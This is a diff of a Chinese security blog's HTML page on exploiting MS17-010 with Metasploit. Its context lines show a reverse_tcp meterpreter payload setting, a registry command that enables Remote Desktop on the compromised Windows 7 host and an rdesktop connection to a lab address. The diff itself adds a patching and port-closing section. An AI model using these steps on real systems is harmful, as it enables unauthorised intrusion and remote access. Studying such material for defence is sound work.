@@ -121,7 +121,7 @@
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxw88o0oqvj30k80b3430.jpg">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxw8tykenxj30ji0etwlq.jpg">
-<meta property="og:updated_time" content="2018-12-06T01:54:25.066Z">
+<meta property="og:updated_time" content="2018-12-06T08:35:36.911Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="内网杀器--MS17-010漏洞">
 <meta name="twitter:description" content="受影响的Windows 版本包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8、Windows 2008、Windows 2008 R2、Windows Server 2012 SP0等。 实战利用：攻击机：kali 目标机：win764位 打开msf 搜索msf17-010模块 s">
@@ -416,7 +416,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2018-12-06 09:54:25" itemprop="dateModified" datetime="2018-12-06T09:54:25+08:00">2018-12-06</time>
+                <time title="修改时间：2018-12-06 16:35:36" itemprop="dateModified" datetime="2018-12-06T16:35:36+08:00">2018-12-06</time>
               
             
           </span>
@@ -512,7 +512,11 @@ set payload windows/x64/meterpreter/reverse_tcp
 <pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
 </code></pre><p>Kali远程桌面连接Win7 </p>
 <pre><code>rdesktop 192.168.209.160:3389
-</code></pre>
+</code></pre><h1 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h1><ul>
+<li>打齐补丁</li>
+<li>关闭135、139、445端口。</li>
+</ul>
+
       
     </div>
 
@@ -551,6 +555,10 @@ set payload windows/x64/meterpreter/reverse_tcp
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/06/windows安全认证/" rel="prev" title="windows安全认证">
+                windows安全认证 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -622,7 +630,7 @@ set payload windows/x64/meterpreter/reverse_tcp
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">24</span>
+                    <span class="site-state-item-count">26</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -665,7 +673,9 @@ set payload windows/x64/meterpreter/reverse_tcp
                     
                       
                     
-                    <span class="site-state-item-count">15</span>
+                      
+                    
+                    <span class="site-state-item-count">16</span>
                     <span class="site-state-item-name">分类</span>
                   </a>
                 </div>
@@ -724,7 +734,7 @@ set payload windows/x64/meterpreter/reverse_tcp
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#实战利用："><span class="nav-number">1.</span> <span class="nav-text">实战利用：</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#实战利用："><span class="nav-number">1.</span> <span class="nav-text">实战利用：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞修补"><span class="nav-number">2.</span> <span class="nav-text">漏洞修补</span></a></li></ol></div>
             
 
           </div>
